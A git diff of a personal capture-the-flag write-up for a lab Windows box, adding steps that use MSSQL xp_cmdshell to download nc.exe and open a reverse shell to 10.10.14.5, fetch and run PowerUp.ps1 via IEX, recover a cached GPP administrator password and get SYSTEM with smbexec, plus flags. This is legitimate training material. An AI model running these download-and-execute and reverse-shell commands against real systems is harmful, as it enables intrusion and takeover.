@@ -17,6 +17,8 @@ tags:
   - nmap
   - smbclient
   - mssqlclient
+  - smbexec
+  - PowerShell
 references: "[[📚CTF Box Writeups]]"
 ---
 
@@ -550,21 +552,68 @@ querier\mssql-svc
 NULL
 ```
 
-
-
-
-- ==resume here==
-- using the `xp_cmdshell` let's get a real shell by transferring `nc` over to RHOST so we can catch a shell
-	- Make sure to `enable_xp_cmdshell` to allow cmds
+- Using the `xp_cmdshell` let's get a real shell by transferring `nc` over to RHOST so we can catch a shell
+	- Make sure to `enable_xp_cmdshell` to allow cmds **IMPORTANT**
 	- `python -m SimpleHTTPServer 80`
 	- `xp_cmdshell "powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\nc.exe http://10.10.14.5/nc.exe"`
 	- `nc -lnvp 443`
+- Send shell to listener
 ```
-xp_cmdshell "C:\Users\mssql-svc\nc.exe 10.10.14.5 443"
+xp_cmdshell "C:\Users\mssql-svc\nc.exe -e cmd.exe 10.10.14.5 443"
 ```
-- ==resume here==
+- Caught shell
+```
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.125] 49692
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+querier\mssql-svc
+```
+
+- User flag - mssql-svc
+```
+C:\Users\mssql-svc\Desktop>type user.txt
+type user.txt
+d9ed27c6e5126ab162f325652c877bac
+```
 
 # PrivEsc
 [[Privilege Escalation]], [[1_Initial_Enumeration]]
 - escalate to root
-- PowerUp
+- PowerUp.ps1 #PowerUp is always first to try.
+	- Transfer over using using #PowerShell 
+	- `powershell -ep bypass`
+	- Start #SimpleHTTPServer in folder with #PowerUp 
+```RHOST
+IEX (New-Object Net.WebClient).downloadstring("http://10.10.14.5/PowerUp.ps1")        
+```
+- Then `Invoke-AllChecks`
+	- #PowerUp is awesome and finds 5 sepearte #PrivEsc points to follow
+	- The easiest of which is the administrator's cleartet password in the cached GPP Files!
+	- `Administrator:MyUnclesAreMarioAndLuigi!!1!`
+- Now we need a shell as admin #smbexec 
+```
+┌──(root㉿kali)-[~]
+└─# smbexec.py administrator@10.10.10.125                               
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+- Root flag - Administrator
+```
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+f972230e8a2946ede9f48b97b81a6f2e
+```
+*smbexec.py cannot use cd, has to be full path*
+
+Done. I learned during this box to take breaks and NOT to try to complete 2 Medium boxes in one day. It is unrealistic and only sets myself up for failure.
+	- also learned #olevba , more #MSSQL and of course all the other tools <3
